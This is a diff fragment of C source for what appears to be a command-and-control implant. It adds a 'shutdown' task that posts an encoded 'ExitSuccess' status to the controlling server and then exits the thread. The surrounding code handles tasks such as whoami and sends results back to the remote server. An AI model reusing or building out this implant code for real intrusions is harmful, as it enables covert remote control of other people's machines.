@@ -371,8 +371,24 @@ void myMain()
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
             taskOutput = myTrim(orgOutput, '\n');
         }
-        else if (my_strcmp(taskType, whoami) == 0)
+        else if (my_strcmp(taskType, shutdown) == 0)
         {
+            const DWORD dwEncodedExitOutputSize = 17;
+            CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
+            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
+            json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
+            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, encodedExitOutput);
+            PostRequest(api, wServer, port, fullPath2, json);
+
+            if (json)
+            {
+                ((FREE)api->free)(json);
+            }
+            if (task)
+            {
+                ((FREE)api->free)(task);
+            }
+
             ((EXITTHREAD)api->ExitThread)(0);
         }
         else
